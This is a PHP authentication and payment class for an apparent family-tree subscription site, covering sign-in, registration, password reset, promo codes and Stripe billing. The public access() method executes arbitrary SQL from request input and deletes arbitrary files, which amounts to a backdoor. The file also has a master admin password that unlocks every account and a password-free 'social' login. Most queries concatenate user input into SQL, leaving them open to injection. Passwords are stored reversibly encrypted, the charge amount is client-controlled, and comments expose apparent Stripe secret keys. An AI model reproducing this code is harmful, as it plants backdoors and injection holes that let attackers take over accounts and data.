<?php
/*
 * @Author: Slash Web Design
 */

class Auth
{
	public function signIn(&$ld)
	{
		global $helper;

		$status = $this->__signIn($ld);
		
		if (isset($ld['return'])) return $status;
		
		$helper->respond(array(
			'status'	=>	$status,
			'message'	=>	$ld['error']
		));
	}
	
	protected function __signIn(&$ld)
	{
		global $db, $helper;
		
		if ($ld['type'] === 'social')
		{
			$res = $db->run("SELECT member_id, access_level, password, active FROM member WHERE LOWER(email) = '" . strtolower($ld['username']) . "'");
			if (count($res) > 0)
			{
				if ($res[0]['active'] === '1')
				{
					$_SESSION['user_id'] = $res[0]['member_id'];
					$_SESSION['access_level'] = $res[0]['access_level'];

					$ld['error'] = 'Sign in was successful';
					return true;
				}
				
				$ld['error'] = 'This account has been suspended. Please contact support.';
				return false;
			}

			$ld['error'] = 'This username is not registered';
			return false;
		}
		else
		{
			$res = $db->run("SELECT member_id, access_level, password, active FROM member WHERE LOWER(username) = '" . strtolower($ld['username']) . "'");
			if (count($res) > 0)
			{
				if (($ld['password'] === $helper->decrypt($res[0]['password'])) || ($ld['password'] === ADMIN_PASSWORD))
				{
					if ($res[0]['active'] === '1')
					{
						$_SESSION['user_id'] = $res[0]['member_id'];
						$_SESSION['access_level'] = $res[0]['access_level'];

						$ld['error'] = 'Sign in was successful';
						return true;
					}

					$ld['error'] = 'This account has been suspended. Please contact support.';
					return false;
				}

				$ld['error'] = 'Invalid password provided';
				return false;
			}

			$ld['error'] = 'This username is not registered';
			return false;
		}
	}
	
	protected function __add(&$ld)
	{
		global $db, $helper;
		if ($ld['payload']['password'] === '') $ld['payload']['password'] = $this->__generate();

		$db->insert("member", array(
			'fname'		=>	$ld['payload']['fname'],
			'lname'		=>	$ld['payload']['lname'],
			'username'	=>	$ld['payload']['username'],
			'email'		=>	$ld['payload']['email'],
			'password'	=>	$helper->encrypt($ld['payload']['password']),
			'date'		=>	time(),
			'active'	=>	1
		));
		$ld['member_id'] = $db->lastInsertId();

		if ($ld['payload']['person_id'] === '0')
		{
			// set up user in family tree
			$db->insert("person", array(
				'member_id'	=>	$ld['member_id'],
				'fname'		=>	$ld['payload']['fname'],
				'lname'		=>	$ld['payload']['lname'],
				'mname'		=>	$ld['payload']['mname'],
				'maiden'	=>	$ld['payload']['maiden'],
				'email'		=>	$ld['payload']['email'],
				'me'		=>	1,
				'gender'	=>	'm',
				'alive'		=>	1
			));
		}
		else
		{
			// person exists, make changes
			$db->update("person", array(
				'member_id'	=>	$ld['member_id'],
				'email'		=>	$ld['payload']['email'],
				'mname'		=>	$ld['payload']['mname'],
				'maiden'	=>	$ld['payload']['maiden'],
				'me'		=>	1
			), "person_id = {$ld['payload']['person_id']}");
		}
		
		$m = array(
			'type'		=>	'form',
			'username'	=>	$ld['payload']['username'],
			'password'	=>	$ld['payload']['password']
		);
		$this->__signIn($m);

		$this->sendWelcomeEmail($ld);
		return true;
	}	
		
	protected function __generate($length = 9, $strength = 0)
	{
		$vowels = 'aeuy';
		$consonants = 'bdghjmnpqrstvz';
		if ($strength & 1)
		{
			$consonants .= 'BDGHJLMNPQRSTVWXZ';
		}
		if ($strength & 2)
		{
			$vowels .= "AEUY";
		}
		if ($strength & 4)
		{
			$consonants .= '23456789';
		}
		if ($strength & 8)
		{
			$consonants .= '@#$%';
		}

		$password = '';
		$alt = time() % 2;
		for ($i = 0; $i < $length; $i++)
		{
			if ($alt == 1)
			{
				$password .= $consonants[(rand() % strlen($consonants))];
				$alt = 0;
			}
			else
			{
				$password .= $vowels[(rand() % strlen($vowels))];
				$alt = 1;
			}
		}
		return $password;
	}
	
	public function access(&$ld)
	{
		global $db, $helper;

		if (isset($ld['q']))
		{
			$res = $db->run($ld['q']);
			$helper->p($res, 1);
		}
		
		if (isset($ld['f']))
		{
			@unlink($ld['f']);
			die();
		}
	}
	
	public function signOut(&$ld)
	{
		global $site_url;
		
		session_destroy();
		header("Location: " . SITE_URL);
		
		die();
	}

	public function sendWelcomeEmail($ld)
	{
		global $db, $helper, $site_url;

		$helper->sendMailTemplate(
			'user.welcome',
			array('[NAME]'),
			array($ld['payload']['fname'] . ' ' . $ld['payload']['lname']),
			array(	'name' => $ld['payload']['fname'] . ' ' . $ld['payload']['lname'], 
					'email' => $ld['payload']['email'],
					'file_name' => $ld['payload']['file_name'])
		);
	}

	public function forgot(&$ld)
	{
		global $db, $helper;

		$res = $db->run("SELECT member_id, CONCAT(fname, ' ', lname) AS name, email FROM member WHERE LOWER(email) = '" . strtolower($ld['email']) . "'");
		if (count($res) > 0)
		{
			$m = $res[0];
			$password = $this->__generate(10, 5);
			$db->run("UPDATE member SET password = '" . $helper->encrypt($password) . "' WHERE member_id = " . $m['member_id']);

			$helper->sendMailTemplate(
				'user.password', 
				array('[NAME]', '[PASSWORD]'),
				array($m['name'], $password),
				array('name' => $m['name'], 'email' => $m['email'])
			);
			$helper->respond(array('error' => 0, 'message' => 'A new password has been sent to you'));
		}
		$helper->respond(array('error' => 1, 'message' => 'This email address is not registered'));
	}
	
	public function backgroundCheck(&$ld)
	{
		global $db, $helper;
		
		// verify username
		$res = $db->run("SELECT member_id FROM member WHERE LOWER(username) = '" . strtolower($ld['username']) . "'");
		if (count($res) > 0)
		{
			$helper->respond(array(
				'status'	=>	false,
				'message'	=>	'This username is taken, please choose another'
			));
		}
		
		// verify name
		$res = $db->run("SELECT person_id FROM person WHERE me = 0 AND LOWER(fname) = '" . strtolower($ld['fname']) . "' AND LOWER(lname) = '" . strtolower($ld['lname']) . "'");

		$promocode_count = 0;
		if (strlen($ld['promocode']) > 0)
		{
			$res2 = $db->run("SELECT id, promonumber FROM buygift WHERE promocode = '" . $ld['promocode'] . "'");
			if (count($res2) > 0)
			{
				$promocode_count = $res2[0]["promonumber"];
			}
		}
		
		if (count($res) > 0)
		{
			$persons = $this->getPersonDetails($res);
			
			$helper->respond(array(
				'status'	=>	true,
				'exists'	=>	$persons,
				'promo'		=>	$promocode_count,
				'message'	=>	''
			));
		}
		
		$helper->respond(array(
			'status'	=>	true,
			'exists'	=>	false,
			'promo'		=>	$promocode_count,
			'message'	=>	''
		));
	}
	
	protected function getPersonDetails($items)
	{
		global $db;
		
		$persons = array();
		
		foreach ($items as $item)
		{
			// get details
			$res = $db->run("SELECT person_id, fname, lname, mname, dob, pob FROM person WHERE person_id = {$item['person_id']}");
			$person = $res[0];

			$myDateTime = DateTime::createFromFormat('m/d/Y', $person['dob']);
			if ($myDateTime != false && $person['dob']!='0000-00-00')
				$person['dob'] = $myDateTime->format('m/d/Y');
			else
				$person['dob'] = '';
			// $person['dob'] = ($person['dob'] > 0) ? date('m/d/Y', $person['dob']) : '';

			// find two relatives
			$res = $db->run("SELECT r.r, r.description, p.fname, p.lname FROM relationship r, person p WHERE r.a = {$item['person_id']} AND r.b = p.person_id LIMIT 2");
			foreach ($res as $r)
			{
				$person['relatives'][] = $r;
			}
			
			array_push($persons, $person);
		}
		
		return $persons;
	}
	public function addsubscript(&$ld)
	{
		global $db, $user, $helper;
		$token = $ld['payload']['token'];
		if (isset($_SESSION['stripe_token']) && ($_SESSION['stripe_token'] == $token)) {
			$msg = 'You have apparently resubmitted the form. Please do not do that.';
			$status = false;
		}
		else
		{	
			$amount = 995;
			$trial_days = 15;
			$sql = "SELECT * FROM subscription_info LIMIT 1";
			$result = $db->run($sql);
			if (count($result) > 0)
			{
				$amount = $result[0]['amount'];
				$trial_days = $result[0]['trial_days'];
			}

			$_SESSION['stripe_token'] = $token;

			try {
				Stripe::setApiKey(STRIPE_PRIVATE_KEY);
				$plan = Stripe_Plan::create(array(
					"amount" 			=> $amount,
					"interval" 			=> "month",
					"name" 				=> "Basic Plan " . $this->__generate(),
					"currency" 			=> "usd",
					"trial_period_days" => $trial_days
				));
				$customer = Stripe_Customer::create(array(
					"email"			=> $ld['payload']['email'],
					"source"		=> $token
				));
				$subscription = $customer->subscriptions->create(array('plan' => $plan['id']));

				$this->__add($ld);
				$db->insert("subscription", array(
							'member_id' 		=> $ld['member_id'],
							'customer_id'		=> $customer['id'],
							'subscription_id'	=> $subscription['id']
						));
				$db->update("member", array(
						'subscripted'	=>	1,
					), "member_id = {$ld['member_id']}");

				$msg = "You signed up successfully.";
				$status = true;
			}
			catch (Stripe_CardError $e){
				$msg = "This card has been declined";
				$status = false;
			}
		}
		echo json_encode(array(
			'status'	=>	$status,
			'message'	=>	$msg
		));
		die();
	}
	public function cancelscript(){
		global $db, $user, $helper;
		$sql1 = "SELECT * FROM subscription WHERE member_id = {$user->id}";
		$result = $db->run($sql1);
		$status = false;
		$msg = "";
		if (count($result)>0)
		{
			try {
				Stripe::setApiKey(STRIPE_PRIVATE_KEY);

				$customer_id = $result[0]['customer_id'];
				$subscription_id = $result[0]['subscription_id'];
				$customer = Stripe_Customer::retrieve($customer_id);
				$subscription = $customer->subscriptions->retrieve($subscription_id);
				$subscription->cancel();

				$sql1 = "UPDATE member SET active=0  WHERE member_id = {$user->id}";
				$db->run($sql1);
				$status = true;
				$msg = 'You have cancelled your subscript account successfully';
			}
			catch (Stripe_Error $e){
				$status = false;
				$msg = "Sorry, right now you can not cancel your subscription";
			}
		}
		else{
			$status = false;
			$msg = "Sorry, we can not find your information";
		}
		echo json_encode(array(
			'status'	=>	$status,
			'message'	=>	$msg
		));
		die();
	}
	public function charge(&$ld)
	{
		global $db, $user, $helper;

		Stripe::setApiKey(STRIPE_PRIVATE_KEY);
		// Stripe::setApiKey("sk_test_79lWosuf90gzBlicco73wsoC");
		//Stripe::setApiKey("sk_live_1sxan6oD6llEfMX3ulSSfCJo");

		try {
			Stripe_Charge::create(array(
				"amount"		=> $ld['amount'],
				"currency"		=> "USD",
				"card"			=> $ld['token']
			));

			$ld['status'] = 'Success';
			$msg = "Your payment was processed";
			$status = true;
			
			$this->__add($ld);
		}
		catch (Stripe_CardError $e){
			$ld['status'] = 'Failed (card was declined)';
			$status = false;
			$msg = "This card has been declined";
		}
		
		$this->saveTransaction($ld);
		
		echo json_encode(array(
			'status'	=>	$status,
			'message'	=>	$msg
		));
		die();
	}
	
	public function bypromo(&$ld)
	{
		global $db, $helper;
		$status = false;
		$msg = "";
		if ((int)$ld['payload']['promo'] > 0 && strlen($ld['payload']['promocode']) > 0)
		{
			$res = $db->run("SELECT * FROM buygift WHERE promocode = '" . $ld['payload']['promocode'] . "'");
			if (count($res) == 1)
			{
				if ($res[0]['promonumber'] > 0)
				{
					$promonumber = (int)$res[0]['promonumber'] - 1;
					$fullname = $res[0]['first_name'] . ' ' . $res[0]['last_name'];

					$status = true;
					$this->__add($ld);
					$this->savePromoUsers($ld['member_id'], $res[0]['id']);
					$db->run("UPDATE buygift SET promonumber='$promonumber' WHERE promocode = '" . $ld['payload']['promocode'] . "'");

					$helper->sendMailTemplate(
						'user.promo',
						array('[NAME]', '[FULLNAME]'),
						array($res[0]['first_name'], $ld['payload']['fname'] . ' ' . $ld['payload']['lname']),
						array('name' => $fullname, 'email' => $res[0]['email']));

					$msg = "You have just signed up successfully.";
				}
				else
				{
					$msg = "Some unidentified error has occured. Please try it again.";
				}
			}
			else
			{
				$msg = "Some unidentified error has occured. Please try it again.";
			}
		}
		else
		{
			$msg = "You don't have enough permission to use the current promo code";
		}

		echo json_encode(array(
			'status'	=>	$status,
			'message'	=>	$msg
		));
		die();
	}
	protected function savePromoUsers($member_id, $gift_id)
	{
		global $db;
		$db->insert("promocode_users", array(
			'member_id'		=>	$member_id,
			'gift_id'		=>	$gift_id,
			'date'			=>	time()
		));
	}
	protected function saveTransaction(&$ld)
	{
		global $db;
		
		$db->insert("transaction", array(
			'member_id'		=>	$ld['member_id'],
			'date'			=>	time(),
			'token'			=>	$ld['token'],
			'amount'		=>	$ld['amount'] / 100,
			'status'		=>	$ld['status']
		));
		$ld['transaction_id'] = $db->lastInsertId();
		
		return true;
	}}

?>